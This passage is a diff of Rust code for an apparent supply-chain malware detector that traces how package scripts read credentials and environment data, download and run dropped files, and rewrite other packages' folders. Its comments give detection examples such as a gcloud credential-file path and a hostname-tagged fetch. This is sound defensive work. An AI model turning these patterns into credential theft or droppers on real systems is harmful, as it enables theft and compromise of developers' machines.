@@ -69,15 +69,24 @@ pub const K_CARVED: u16 = 1 << 12;
 /// not local data: a file opened for writing (what: the keys of its path,
 /// one per line: [`path_keys`])
 pub const K_WFILE: u16 = 1 << 13;
+/// not local data: what the script reads back from itself (its own file,
+/// its docstring, its loader's source) or from a data file shipped with it,
+/// and the paths of those files (Python's model, 0.1.9: N-19); run as code,
+/// it is code the script reads back from its own file
+pub const K_OWN: u16 = 1 << 14;
+/// not local data: a path in another package's folder (what: the package):
+/// `require.resolve('<pkg>/…')`, a path joined from `node_modules` and a
+/// package's name (D-9); code written there rewrites that package
+pub const K_PKG: u16 = 1 << 15;
 
 /// The kinds' names (the text follower's strings), by bit index.
-pub const KIND_NAMES: [&str; 14] = [
+pub const KIND_NAMES: [&str; 16] = [
     "identity", "environment", "environment", "file", "report", "credentials", "address", "path", "file", "received",
-    "decoded", "bytes", "carved", "written",
+    "decoded", "bytes", "carved", "written", "own", "package",
 ];
 
 /// The kinds a send of local data never reports.
-pub(crate) const NOT_LOCAL: u16 = K_PATH | K_RECEIVED | K_DECODED | K_BYTES | K_CARVED | K_WFILE;
+pub(crate) const NOT_LOCAL: u16 = K_PATH | K_RECEIVED | K_DECODED | K_BYTES | K_CARVED | K_WFILE | K_OWN | K_PKG;
 
 /// What a file written then run held: code or a program the script decodes,
 /// one it carves out of another file, one it downloads.
@@ -155,6 +164,53 @@ pub(crate) fn first_drop(text: &[u32], findings: &[Out]) -> Option<DropRun> {
             let at = (at as usize).min(text.len());
             DropRun { line: text[..at].iter().filter(|&&c| c == 0x0A).count() + 1, kinds, what: what.clone(), interp: interp.clone() }
         })
+}
+
+/// The finding for a written file run: what it held decoded or carved out of another file, or downloaded and run by an
+/// interpreter (a program downloaded and run is what installers of binaries do: none).
+pub(crate) fn dropped_out(w: &Written, interp: Option<PyStr>, at: u32) -> Option<Out> {
+    let interp = script_interp(w, interp);
+    if w.kinds & (K_DECODED | K_CARVED) == 0 && interp.is_none() {
+        return None;
+    }
+    Some(Out::Dropped { at, from: w.at, kinds: w.kinds, what: w.what.clone(), interp })
+}
+
+/// The written file a run runs, with its interpreter: one of the paths it may run (their keys), or one a constant
+/// command line of it runs (`_DL_RUNNERS`).
+fn run_of_written(sup: &Supply, runs: &[(Vec<PyStr>, Option<PyStr>)], lines: &[PyStr]) -> Option<(Written, Option<PyStr>)> {
+    for (keys, interp) in runs {
+        if let Some(w) = written_at(&sup.written, keys) {
+            return Some((w, interp.clone()));
+        }
+    }
+    if !lines.is_empty() {
+        let table = sup.written.borrow().clone();
+        for w in table {
+            for k in w.keys.iter().filter(|k| k.first() == Some(&0x3D)) {
+                let seg = lines.iter().flat_map(|l| l.split(|&c| c == 0x3B || c == 0x26 || c == 0x7C || c == 0x0A)).find(|seg| {
+                    crate::received::command_runs(sup.p(), seg, &k[1..])
+                });
+                if let Some(seg) = seg {
+                    let interp = pystr::split_ws(seg).first().and_then(|w| interp_name(w));
+                    return Some((w.clone(), interp));
+                }
+            }
+        }
+    }
+    None
+}
+
+/// The runs read before a write of their file was known, whose file is known written by the end (D-2), but for
+/// those `findings` has already.
+pub(crate) fn late_drops(sup: &Supply, findings: &[Out]) -> Vec<Out> {
+    let known: HashSet<u32> = findings.iter().filter_map(|f| if let Out::Dropped { at, .. } = f { Some(*at) } else { None }).collect();
+    let pending = sup.runs.borrow().clone();
+    pending
+        .iter()
+        .filter(|r| !known.contains(&r.at))
+        .filter_map(|r| run_of_written(sup, &r.runs, &r.lines).and_then(|(w, interp)| dropped_out(&w, interp, r.at)))
+        .collect()
 }
 
 /// A command line's parts: literal text, or an expression.
@@ -294,6 +350,20 @@ pub(crate) fn cred_store(p: &Pack, what: &[u32]) -> bool {
     p.re("_CRED_STORE_RE").search(what).is_some() && p.re("_PUBLIC_KEY_FILE_RE").search(what).is_none()
 }
 
+/// A path's text as a source keeps it: its first 60 characters; but when only the whole text names a credential store,
+/// "…" and the 59 that end with that name, so that what is shown, and graded from it, still names the store (GR-7:
+/// `path.join(os.homedir(), '.config', 'gcloud', 'application_default_credentials.json')`).
+pub(crate) fn shown_what(p: &Pack, text: &[u32]) -> PyStr {
+    let head = pystr::upto(text, 60);
+    if head.len() == text.len() || cred_store(p, head) || !cred_store(p, text) {
+        return head.to_vec();
+    }
+    let end = p.re("_CRED_STORE_RE").search(text).map(|m| m.end()).unwrap_or(text.len());
+    let mut out = vec![0x2026];
+    out.extend_from_slice(&text[end.saturating_sub(59)..end]);
+    out
+}
+
 /// The kind's bit for a kind name (the text follower's, and shell.rs's).
 pub(crate) fn kind_bit(kind: &str, what: &[u32], whole: &[u32]) -> u16 {
     match kind {
@@ -312,6 +382,61 @@ pub(crate) fn bit_index(bit: u16) -> u8 {
     bit.trailing_zeros() as u8
 }
 
+/// Is a member's name an environment variable's, as programs name them: capitals, digits and underscores
+/// (`NODE_ENV`, `PRISMA_MANAGEMENT_API_URL`), npm's lower-case ones (`npm_config_registry`) and the proxies'
+/// (`http_proxy`)? Not a name objects give their members (`env`, `parsed`, `vars`).
+fn env_var_name(n: &[u32]) -> bool {
+    let up = |c: u32| ('A' as u32..='Z' as u32).contains(&c);
+    let digit = |c: u32| ('0' as u32..='9' as u32).contains(&c);
+    let upper = n.len() >= 2
+        && !digit(n[0])
+        && n.iter().any(|&c| up(c))
+        && n.iter().all(|&c| up(c) || digit(c) || c == '_' as u32);
+    upper || pystr::starts_with(n, "npm_") || is_one(n, &["http_proxy", "https_proxy", "no_proxy", "all_proxy"])
+}
+
+/// Does a member's name hold the environment (`env`, `environment`, `processEnv`)? (D-16)
+fn env_holder_name(n: &[u32]) -> bool {
+    pystr::contains(&pystr::lower(n), "env")
+}
+
+/// What a member of a name that is not the environment's holds of `obj` (D-16): its value without the whole
+/// environment, its parameters read through a member (MEMBER_KEY).
+pub(super) fn sc_through_member(obj: &V) -> V {
+    sc_without(&obj.plain(), K_WHOLE_ENV).through_member()
+}
+
+/// Built-in methods that give back what their object holds, or a part of it (an array's, a string's, a map's, a
+/// promise's, a response's, a form's): a call of one on a parameter gives what the parameter is given (D-16).
+const PASS_THROUGH: &[&str] = &[
+    "at", "concat", "copyWithin", "entries", "fill", "filter", "find", "findLast", "flat", "flatMap", "join", "keys",
+    "map", "pop", "reduce", "reduceRight", "reverse", "shift", "slice", "sort", "splice", "toReversed", "toSorted",
+    "toSpliced", "values", "with", "toString", "toLocaleString", "charAt", "normalize", "padEnd", "padStart", "repeat",
+    "replace", "replaceAll", "split", "substr", "substring", "toLowerCase", "toUpperCase", "toLocaleLowerCase",
+    "toLocaleUpperCase", "trim", "trimEnd", "trimStart", "trimLeft", "trimRight", "match", "matchAll", "valueOf",
+    "toJSON", "toWellFormed", "get", "getAll", "then", "catch", "finally", "json", "text", "arrayBuffer", "blob",
+    "subarray", "next", "toObject", "getBuffer", "getBody", "toBuffer", "serialize", "stringify", "encode", "read",
+];
+
+/// A value without one kind of source (its parameters kept): nothing when
+/// that was all it held.
+pub(crate) fn sc_without(v: &V, bit: u16) -> V {
+    let sc = match v.sc.as_ref() {
+        Some(sc) if sc.kinds & bit != 0 => sc,
+        _ => return v.clone(),
+    };
+    let kinds = sc.kinds & !bit;
+    if kinds == 0 {
+        if v.params.is_empty() {
+            return V::empty();
+        }
+        return V::new(false, None, None, None, v.params.clone(), v.clean, v.built, v.kind);
+    }
+    let idx = bit_index(bit);
+    let firsts = sc.firsts.iter().filter(|f| f.0 != idx).cloned().collect();
+    V { sc: Some(Rc::new(Sc { kinds, firsts })), ..v.clone() }
+}
+
 // V.kind marks (bits 1 and 2 are project mode's request and response objects)
 
 /// a connection, or a request being written: its write, end, send … send
@@ -321,8 +446,14 @@ pub const OBJ_CONN: u8 = 4;
 pub const OBJ_CLIENT: u8 = 8;
 /// process.env itself: a member of it is one variable
 pub const OBJ_ENV: u8 = 16;
+/// a server the script made (`http.createServer()`): what it is sent is
+/// received — its request handler's arguments, its events' (`on('request'
+/// | 'connection', …)`) — but the server holds nothing it was sent: its
+/// address, its options and what a framework keeps beside it are not
+/// received data (vite's dev server)
+pub const OBJ_SERVER: u8 = 32;
 /// the marks a closure's variable keeps
-pub const MARKS: u8 = OBJ_CONN | OBJ_CLIENT | OBJ_ENV;
+pub const MARKS: u8 = OBJ_CONN | OBJ_CLIENT | OBJ_ENV | OBJ_SERVER;
 
 /// The categories a parameter's reach is recorded under: what is sent, and
 /// what only an address holds.
@@ -341,7 +472,11 @@ pub const RUN_CODE: u8 = 5;
 pub const LOAD_NAME: u8 = 6;
 pub const DESERIALIZE: u8 = 7;
 
-/// A received-code category's name (`_DL_CATEGORY_REASON`'s keys).
+/// A container's methods that put what they are given into it (a splice, its items from the third argument on).
+const COLLECTS: &[&str] = &["push", "unshift", "splice", "set", "add", "append", "fill"];
+/// The calls that put what they are given (after the first argument) into their first argument.
+const PUTS_INTO_FIRST: &[&str] =
+    &["Object.assign", "Object.defineProperty", "Object.defineProperties", "Reflect.set", "Reflect.defineProperty"];
 /// The calls that decode what they are given (the text rule's
 /// `_DECODE_CALL_RE`, read by name).
 const DECODERS: &[&str] = &[
@@ -349,6 +484,7 @@ const DECODERS: &[&str] = &[
     "zlib.gunzipSync", "zlib.unzipSync", "zlib.brotliDecompressSync",
 ];
 
+/// A received-code category's name (`_DL_CATEGORY_REASON`'s keys).
 pub fn received_cat(cat: u8) -> Option<&'static str> {
     match cat {
         RUN_CODE => Some("run"),
@@ -375,6 +511,20 @@ pub struct Supply {
     /// the files the script writes code or a program to (a run of one is
     /// a dropper's)
     pub written: std::cell::RefCell<Vec<Written>>,
+    /// the runs of a file read before any write of it was known (D-2: a
+    /// callback's download is known when its summary is applied, after the
+    /// callback that runs the file was read): matched at the end
+    pub runs: std::cell::RefCell<Vec<PendingRun>>,
+}
+
+/// A run of a file (`sc_file_run`) whose file no write was known for yet: the
+/// paths it may run (their keys, the interpreter), its constant command
+/// lines, where.
+#[derive(Clone, Debug)]
+pub struct PendingRun {
+    pub runs: Vec<(Vec<PyStr>, Option<PyStr>)>,
+    pub lines: Vec<PyStr>,
+    pub at: u32,
 }
 
 use std::collections::HashSet;
@@ -391,6 +541,7 @@ impl Supply {
             whole,
             arg_of: std::cell::RefCell::new(None),
             written: std::cell::RefCell::new(Vec::new()),
+            runs: std::cell::RefCell::new(Vec::new()),
         }
     }
 
@@ -423,11 +574,21 @@ const LOOKUP: Spec = Spec { addresses: -1, composed: true };
 /// The HTTP clients a name no declaration binds is taken for.
 pub const CLIENT_GLOBALS: &[&str] = &["axios", "got", "needle", "superagent", "ky", "undici"];
 
+/// Names the platform defines besides GLOBAL_OBJECTS: no address of the
+/// script's own (sc_constant_text).
+const PLATFORM_NAMES: &[&str] = &[
+    "undefined", "NaN", "Infinity", "self", "global", "location", "top", "parent", "frames", "module", "exports",
+    "require", "define", "__dirname", "__filename",
+];
+
 const FETCH_MODULES: &[&str] = &[
     "node-fetch", "cross-fetch", "isomorphic-fetch", "isomorphic-unfetch", "make-fetch-happen", "minipass-fetch",
     "node-fetch-native", "ofetch",
 ];
 const POSTERS: &[&str] = &["axios", "got", "needle", "superagent", "ky"];
+/// The `request` client and its forks: `request(options, callback)` and
+/// `request.get(url, callback)`, the callback given the response's body.
+const REQUEST_CLIENTS: &[&str] = &["request", "@cypress/request", "postman-request"];
 const CONN_WRITES: &[&str] = &["write", "end", "send", "sendall", "sendto", "request"];
 const CONN_CHAIN: &[&str] =
     &["on", "once", "addListener", "prependListener", "setHeader", "setTimeout", "setNoDelay", "setKeepAlive", "setEncoding"];
@@ -451,6 +612,46 @@ fn last_part(name: &[u32]) -> &[u32] {
 
 fn is_one(name: &[u32], set: &[&str]) -> bool {
     set.iter().any(|s| eq(name, s))
+}
+
+/// The names of the members of a name a module puts anything into: a container's method called on it
+/// (`o.list.push(…)`, COLLECTS) or a call of PUTS_INTO_FIRST given it first (`Object.assign(o.opts, …)`), as
+/// written. Only those of a name's members are read as containers (sc_member_held, D-3b).
+pub(super) fn collected_members(a: &Ast) -> HashSet<PyStr> {
+    let named_member = |n: NodeId| -> Option<PyStr> {
+        if n == NONE {
+            return None;
+        }
+        let n = a.unwrap(n);
+        if a.kind(n) == Kind::MemberExpression && !a.computed(n) && a.kind(a.at(n, jt::A)) == Kind::Identifier {
+            a.prop_name(n)
+        } else {
+            None
+        }
+    };
+    let mut out = HashSet::new();
+    for id in 0..a.0.nodes.len() as NodeId {
+        if a.kind(id) != Kind::CallExpression {
+            continue;
+        }
+        let callee = a.unwrap(a.at(id, jt::A));
+        if a.kind(callee) != Kind::MemberExpression || a.computed(callee) {
+            continue;
+        }
+        let Some(method) = a.prop_name(callee) else { continue };
+        let recv = a.unwrap(a.at(callee, jt::A));
+        if is_one(&method, COLLECTS) {
+            out.extend(named_member(recv));
+        } else if a.is_ident_named(recv, "Object") || a.is_ident_named(recv, "Reflect") {
+            let mut full = a.name(recv).to_vec();
+            full.push(0x2E);
+            full.extend_from_slice(&method);
+            if is_one(&full, PUTS_INTO_FIRST) {
+                out.extend(a.list(id, jt::B).first().and_then(|&first| named_member(first)));
+            }
+        }
+    }
+    out
 }
 
 fn dotted2<'a>(a: &'a str, b: &'a [&'a str]) -> impl Fn(&[u32]) -> bool + 'a {
@@ -510,6 +711,16 @@ fn send_spec(names: &[PyStr]) -> Option<Spec> {
         if is_one(n, &["http.get", "http.request", "https.get", "https.request", "axios.get", "got", "got.get"]) {
             return Some(ADDRESS);
         }
+        // (request: the options hold the address and what is sent: form,
+        // formData, body, json; a GET's data is only its address)
+        for m in REQUEST_CLIENTS {
+            if eq(n, m) || dotted2(m, &["post", "put", "patch"])(n) {
+                return Some(OPTIONS);
+            }
+            if dotted2(m, &["get", "head", "del", "delete"])(n) {
+                return Some(ADDRESS);
+            }
+        }
         if eq(n, "dns.lookup") || eq(n, "dns.promises.lookup") {
             return Some(LOOKUP);
         }
@@ -534,10 +745,33 @@ fn makes_connection(names: &[PyStr]) -> bool {
     })
 }
 
+/// Does a call of these names make a server (OBJ_SERVER)?
+fn makes_server(names: &[PyStr]) -> bool {
+    names.iter().any(|n| {
+        is_one(
+            n,
+            &[
+                "http.createServer", "https.createServer", "http2.createServer", "http2.createSecureServer",
+                "net.createServer", "tls.createServer",
+            ],
+        )
+    })
+}
+
+/// A server's methods that register a listener of its events: the events
+/// that carry what it is sent (SERVER_DATA_EVENTS) give the listener
+/// received data; its other events (`error`, `listening`, `close`) don't.
+const SERVER_EVENTS: &[&str] = &["on", "once", "addListener", "prependListener", "prependOnceListener"];
+const SERVER_DATA_EVENTS: &[&str] = &[
+    "request", "connection", "secureConnection", "upgrade", "connect", "checkContinue", "checkExpectation",
+    "stream", "session", "message", "data",
+];
+
 /// Does a call of these names make a client (its calls send)?
 fn makes_client(names: &[PyStr]) -> bool {
     names.iter().any(|n| {
         is_one(n, &["axios.create", "got.extend", "got.create", "ky.create", "ky.extend"])
+            || REQUEST_CLIENTS.iter().any(|m| dotted2(m, &["defaults"])(n))
     })
 }
 
@@ -566,7 +800,7 @@ fn receives(names: &[PyStr]) -> bool {
         ) {
             return true;
         }
-        POSTERS.iter().any(|m| eq(n, m) || CLIENT_CALLS.iter().any(|c| eq(n, &format!("{}.{}", m, c))))
+        POSTERS.iter().chain(REQUEST_CLIENTS).any(|m| eq(n, m) || CLIENT_CALLS.iter().chain(&["del"]).any(|c| eq(n, &format!("{}.{}", m, c))))
     })
 }
 
@@ -689,14 +923,15 @@ impl<'p> Eval<'p> {
     fn sc_names(&mut self, callee: NodeId, scope: ScopeId) -> Vec<PyStr> {
         let m = self.m;
         let mut out: Vec<PyStr> = Vec::new();
-        let (member, obj, prop) = {
+        let (member, obj) = {
             let a = self.a();
             if a.kind(callee) == Kind::MemberExpression {
-                (true, a.at(callee, jt::A), a.prop_name(callee))
+                (true, a.at(callee, jt::A))
             } else {
-                (false, NONE, None)
+                (false, NONE)
             }
         };
+        let prop = if member { self.p.member_name(m, callee, scope) } else { None };
         if member {
             if let Some(prop) = &prop {
                 // a global's own member: self.fetch, global.fetch
@@ -957,7 +1192,7 @@ impl<'p> Eval<'p> {
         if sup.p().re("_LD_FS_ROOT_RE").match_(span).is_none() && sup.p().re("_LD_CRED_FILE_RE").match_(span).is_none() {
             return V::empty();
         }
-        self.sc_source(K_PATH, pystr::upto(value, 60).to_vec(), n.start, a.line(node), 0)
+        self.sc_source(K_PATH, shown_what(sup.p(), value), n.start, a.line(node), 0)
     }
 
     /// An identifier no declaration binds (an implicit global, or one the
@@ -1040,7 +1275,7 @@ impl<'p> Eval<'p> {
                         Some(pl) => pl.group(2).unwrap_or(&[]).to_vec(),
                         None => arg.to_vec(),
                     };
-                    return Some(self.sc_source(K_FILE, pystr::upto(&what, 60).to_vec(), at, line, 0));
+                    return Some(self.sc_source(K_FILE, shown_what(p, &what), at, line, 0));
                 }
                 // (a path outside the package given it: a parameter, a name)
                 if let Some(sc) = args.first().and_then(|v| v.sc.clone()) {
@@ -1215,7 +1450,8 @@ impl<'p> Eval<'p> {
 
     /// Does an expression come from the function's caller: a parameter of
     /// a function around it, `this`, `arguments`, or what is made of them
-    /// (`options.url`, `` `${this.baseUrl}/x` ``)?
+    /// (`options.url`, `` `${this.baseUrl}/x` ``, a loop's variable over
+    /// `urls`)?
     pub(super) fn sc_from_caller(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
         if depth > 16 || node == NONE {
             return false;
@@ -1238,13 +1474,27 @@ impl<'p> Eval<'p> {
                 if module != self.m {
                     return false;
                 }
-                if writes.iter().any(|w| matches!(w, Write::Param { .. })) {
-                    return true;
+                // (a parameter; one whose default is text the script writes is the
+                // script's own when its caller gives nothing: `function get(o = OPTIONS)`,
+                // a dropper's exported function called with no arguments)
+                for w in writes.iter() {
+                    if let Write::Param { node: p, scope: s, .. } = w {
+                        if !self.sc_own_default(*p, *s, depth) {
+                            return true;
+                        }
+                    }
                 }
-                // (a name given what comes from the caller)
+                // (a name given what comes from the caller; a loop's variable, an
+                // item or a key of what it walks)
                 return writes.iter().take(8).any(|w| match w {
                     Write::Init { node: v, scope: s, .. } | Write::Assign { node: v, scope: s, .. } => {
                         self.sc_from_caller(*v, *s, depth + 1)
+                    }
+                    Write::Opaque { node: v, scope: s }
+                        if matches!(self.a().kind(*v), Kind::ForOfStatement | Kind::ForInStatement) =>
+                    {
+                        let right = self.a().at(*v, jt::B);
+                        self.sc_from_caller(right, *s, depth + 1)
                     }
                     _ => false,
                 });
@@ -1281,18 +1531,149 @@ impl<'p> Eval<'p> {
         parts.into_iter().any(|p| !self.a().is_function(p) && self.sc_from_caller(p, scope, depth + 1))
     }
 
+    /// A parameter `p` (its node in the function's list) with a default the
+    /// script writes itself, one no caller gives: `o = OPTIONS`, not `o = a`.
+    fn sc_own_default(&mut self, p: NodeId, scope: ScopeId, depth: u32) -> bool {
+        let (left, right) = {
+            let a = self.a();
+            if a.kind(p) != Kind::AssignmentPattern {
+                return false;
+            }
+            (a.at(p, jt::A), a.at(p, jt::B))
+        };
+        self.a().is_ident(left) && !self.sc_from_caller(right, scope, depth + 1) && self.sc_constant_text(right, scope, depth + 1)
+    }
+
+    /// Is the value at `node` built from text the script writes: a string or
+    /// template literal, in it or in what a name it reads is given (a
+    /// constant's, an object or array literal's, a concatenation's part, a
+    /// branch's, a call's argument or receiver, an item of what a loop
+    /// walks), or from a global the page or another file defines (`src`)?
+    /// A request's address that isn't is no address of the script's own,
+    /// though its caller doesn't give it either: it is a library's, worked
+    /// out from what it is given (Monaco's module loader fetches the module
+    /// ids it is asked for, vitest's runner the modules a WebAssembly binary
+    /// imports), or no address (an object: a namespace TypeScript's emit
+    /// passes its module function).
+    pub(super) fn sc_constant_text(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
+        let mut seen: Vec<BindId> = Vec::new();
+        self.sc_constant_text_in(node, scope, depth, true, &mut seen)
+    }
+
+    /// (each name read once: a name met again gave no constant the first
+    /// time, or the reading would have stopped there; `value`: the node is
+    /// read for its value, not called or read for a member)
+    fn sc_constant_text_in(&mut self, node: NodeId, scope: ScopeId, depth: u32, value: bool, seen: &mut Vec<BindId>) -> bool {
+        if depth > 16 || node == NONE {
+            return false;
+        }
+        let kind = self.a().kind(node);
+        let parts: Vec<NodeId> = match kind {
+            Kind::Literal => return self.a().is_string(node),
+            Kind::TaggedTemplateExpression => return true,
+            Kind::TemplateLiteral => {
+                let a = self.a();
+                if a.list(node, jt::A).iter().any(|&q| !a.s(q, jt::A).is_empty()) {
+                    return true;
+                }
+                a.list(node, jt::B).to_vec()
+            }
+            Kind::Identifier => {
+                let b = match self.bind(node, scope) {
+                    Some(b) => b,
+                    // a name no declaration in the file binds, read for its value,
+                    // is a global the page or another file defines (`axios.get(src)`):
+                    // no caller gives it and nothing here works it out, so it is
+                    // the script's own, as text is; the platform's objects (`window`,
+                    // `global`, `location`), and a global read for a member or
+                    // called (`location.href`, `new Map()`), are not
+                    None => {
+                        let name = self.a().name(node);
+                        return value && !is_in(GLOBAL_OBJECTS, name) && !is_one(name, PLATFORM_NAMES);
+                    }
+                };
+                if seen.contains(&b) {
+                    return false;
+                }
+                seen.push(b);
+                let (module, writes) = {
+                    let bind = &self.p.binds[b as usize];
+                    (bind.module, bind.writes.clone())
+                };
+                if module != self.m {
+                    return false;
+                }
+                return writes.iter().take(8).any(|w| match w {
+                    Write::Init { node: v, scope: s, .. } | Write::Assign { node: v, scope: s, .. } => {
+                        self.sc_constant_text_in(*v, *s, depth + 1, value, seen)
+                    }
+                    // (a parameter's default: what it holds when no caller gives it)
+                    Write::Param { node: p, scope: s, .. } if self.a().kind(*p) == Kind::AssignmentPattern => {
+                        let (left, right) = (self.a().at(*p, jt::A), self.a().at(*p, jt::B));
+                        self.a().is_ident(left) && self.sc_constant_text_in(right, *s, depth + 1, value, seen)
+                    }
+                    // (a loop's variable: an item, or a key, of what it walks)
+                    Write::Opaque { node: v, scope: s }
+                        if matches!(self.a().kind(*v), Kind::ForOfStatement | Kind::ForInStatement) =>
+                    {
+                        let right = self.a().at(*v, jt::B);
+                        self.sc_constant_text_in(right, *s, depth + 1, true, seen)
+                    }
+                    _ => false,
+                });
+            }
+            // (what a member is read from, and a call's callee, are not read for
+            // their value: a constant one still gives text, `'…'.concat(x)`)
+            Kind::MemberExpression => {
+                let (obj, prop, computed) = {
+                    let a = self.a();
+                    (a.at(node, jt::A), a.at(node, jt::B), a.computed(node))
+                };
+                return self.sc_constant_text_in(obj, scope, depth + 1, false, seen)
+                    || (computed && self.sc_constant_text_in(prop, scope, depth + 1, false, seen));
+            }
+            Kind::BinaryExpression | Kind::LogicalExpression => vec![self.a().at(node, jt::A), self.a().at(node, jt::B)],
+            Kind::ConditionalExpression => vec![self.a().at(node, jt::B), self.a().at(node, jt::C)],
+            Kind::UnaryExpression | Kind::AwaitExpression | Kind::ChainExpression | Kind::SpreadElement => {
+                vec![self.a().at(node, jt::A)]
+            }
+            Kind::AssignmentExpression => vec![self.a().at(node, jt::B)],
+            Kind::SequenceExpression => self.a().list(node, jt::A).iter().rev().take(1).copied().collect(),
+            Kind::ArrayExpression => self.a().list(node, jt::A).iter().copied().filter(|&e| e != NONE).collect(),
+            Kind::ObjectExpression => {
+                let props = self.a().list(node, jt::A).to_vec();
+                props
+                    .into_iter()
+                    .map(|p| if self.a().kind(p) == Kind::Property { self.a().at(p, jt::B) } else { self.a().at(p, jt::A) })
+                    .collect()
+            }
+            Kind::CallExpression | Kind::NewExpression => {
+                let callee = self.a().at(node, jt::A);
+                if !self.a().is_function(callee) && self.sc_constant_text_in(callee, scope, depth + 1, false, seen) {
+                    return true;
+                }
+                self.a().list(node, jt::B).to_vec()
+            }
+            _ => return false,
+        };
+        parts.into_iter().any(|p| !self.a().is_function(p) && self.sc_constant_text_in(p, scope, depth + 1, true, seen))
+    }
+
     /// Is a receiving call's address the script's own — what the script
     /// read or received (`fetch('https://…' + os.hostname())`, a dead drop's
-    /// address), or anything its caller doesn't give it — rather than one a
-    /// caller gives (a library's request for its user: `load(url)`,
-    /// `request(options)`, `${this.baseUrl}`)? A server's and a socket's data
-    /// are their own.
+    /// address), or text the script writes, or a global, that its caller
+    /// doesn't give it — rather than one a caller gives (a library's request
+    /// for its user: `load(url)`, `request(options)`, `${this.baseUrl}`, an
+    /// item of a list it is given) or one it works out from what it is given
+    /// (sc_constant_text)? A server's and a socket's data are their own.
     fn sc_own_address(&mut self, node: NodeId, names: &[PyStr], member: bool, args: &[V], scope: ScopeId) -> bool {
         let arg_nodes = self.a().list(node, jt::B).to_vec();
         let own = |me: &mut Self, i: usize| -> bool {
             match (arg_nodes.get(i), args.get(i)) {
-                (Some(&n), Some(v)) => (v.src && v.params.is_empty()) || !me.sc_from_caller(n, scope, 0),
-                (Some(&n), None) => !me.sc_from_caller(n, scope, 0),
+                (Some(&n), Some(v)) => {
+                    (v.src && v.params.is_empty()) || (!me.sc_from_caller(n, scope, 0) && me.sc_constant_text(n, scope, 0))
+                }
+                (Some(&n), None) => !me.sc_from_caller(n, scope, 0) && me.sc_constant_text(n, scope, 0),
                 _ => false,
             }
         };
@@ -1327,7 +1708,8 @@ impl<'p> Eval<'p> {
 
     /// A call of the script's own downloader (its parameter `i` is a
     /// request's address: `const get = (u) => fetch(u)`), given the
-    /// script's own address: what it returns is received.
+    /// script's own address (as sc_own_address reads one): what it returns
+    /// is received.
     pub(super) fn sc_wrapper_receives(&mut self, node: NodeId, i: usize, t: &V) -> Option<V> {
         let arg = {
             let a = self.a();
@@ -1341,7 +1723,7 @@ impl<'p> Eval<'p> {
             *args.get(i)?
         };
         let scope = self.cur;
-        if !((t.src && t.params.is_empty()) || !self.sc_from_caller(arg, scope, 0)) {
+        if !((t.src && t.params.is_empty()) || (!self.sc_from_caller(arg, scope, 0) && self.sc_constant_text(arg, scope, 0))) {
             return None;
         }
         let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
@@ -1820,6 +2202,23 @@ impl<'p> Eval<'p> {
         let name = name?;
         let at = self.a().0.nodes[node as usize].start;
         let arg_nodes = self.a().list(node, jt::B).to_vec();
+        // a code file in another package's folder written, copied or moved to (D-9)
+        let target = if is_one(name, WRITE_FILES) || eq(name, "createWriteStream") {
+            Some(0)
+        } else if is_one(name, &["copyFileSync", "copyFile", "renameSync", "rename", "cpSync", "cp"]) {
+            Some(1)
+        } else {
+            None
+        };
+        if let (Some(i), true) = (target, self.emit) {
+            if let (Some(v), Some(&n)) = (args.get(i), arg_nodes.get(i)) {
+                if let Some(pkg) = v.sc.as_ref().and_then(|sc| sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PKG)).map(|(_, w, _)| (**w).clone()) {
+                    if self.sc_code_path(n, scope) {
+                        self.findings.push(Out::Rewrote { at, pkg });
+                    }
+                }
+            }
+        }
         if eq(name, "createWriteStream") {
             let keys = self.sc_path_keys(*arg_nodes.first()?, scope);
             let what = pystr::join(&u("\n"), &keys.iter().map(|k| k.as_slice()).collect::<Vec<_>>());
@@ -1849,9 +2248,189 @@ impl<'p> Eval<'p> {
             return None;
         };
         if let Some(sc) = data.as_ref().filter(|d| d.src).and_then(|d| d.sc.clone()) {
-            record_written(&self.sup().written, keys, &sc, at);
+            record_written(&self.sup().written, keys.clone(), &sc, at);
+        }
+        // (a parameter written: the function's summary keeps the file, so a callback given a download writes it, D-2)
+        if let Some(d) = data.as_ref() {
+            for &key in d.params.iter() {
+                self.pf_adds.push((key, keys.clone(), at));
+            }
         }
         None
+    }
+
+    /// supply mode: a path in another package's folder a call makes (D-9): `require.resolve('<pkg>/…')`, or one
+    /// joined from `node_modules` and a package's name (`path.join(…, 'node_modules', '@scope', 'name', …)`,
+    /// `'node_modules/<pkg>/…'` as one of its parts). Its value: that package's path, else nothing.
+    pub(super) fn sc_pkg_path(&self, node: NodeId, names: &[PyStr], scope: ScopeId) -> V {
+        let resolve = self.sc_require_resolve(node, scope);
+        let join = names.iter().any(|n| {
+            is_one(n, &["path.join", "path.resolve", "path.posix.join", "path.posix.resolve", "path.win32.join", "path.win32.resolve"])
+        });
+        if !resolve && !join {
+            return V::empty();
+        }
+        let args = self.a().list(node, jt::B).to_vec();
+        let mut pkg: Option<PyStr> = None;
+        if resolve {
+            pkg = args.first().and_then(|&f| self.sc_const_str(f)).and_then(|s| crate::jsloads::npm_package(&s));
+        } else {
+            // the literal parts, each split at its separators; an expression is a part of its own
+            let mut parts: Vec<Option<PyStr>> = Vec::new();
+            for &x in args.iter().take(16) {
+                match self.sc_const_str(x) {
+                    Some(s) => parts.extend(s.split(|&c| c == 0x2F || c == 0x5C).filter(|p| !p.is_empty()).map(|p| Some(p.to_vec()))),
+                    None => parts.push(None),
+                }
+            }
+            for k in 0..parts.len() {
+                if parts[k].as_deref().is_some_and(|p| eq(p, "node_modules")) {
+                    let spec = match (parts.get(k + 1).cloned().flatten(), parts.get(k + 2).cloned().flatten()) {
+                        (Some(scope), Some(name)) if scope.first() == Some(&0x40) => {
+                            Some(pystr::join(&u("/"), &[scope.as_slice(), name.as_slice()]))
+                        }
+                        (Some(name), _) if name.first() != Some(&0x40) => Some(name),
+                        _ => None,
+                    };
+                    if let Some(found) = spec.and_then(|sp| crate::jsloads::npm_package(&sp)) {
+                        pkg = Some(found);
+                    }
+                }
+            }
+            // (D-9b) a climb out of the script's own folder to a scoped package beside its own:
+            // `path.join(__dirname, '..', '..', '@scope', 'name', …)`. An unscoped name after the climb is as likely
+            // one of the package's own folders (`lib`, `src`), so only a scope says it is another package
+            if pkg.is_none() && self.sc_script_dir(args.first().copied(), scope) {
+                let climbed = parts.iter().skip(1).take_while(|p| p.as_deref().is_some_and(|p| eq(p, ".."))).count();
+                if climbed > 0 {
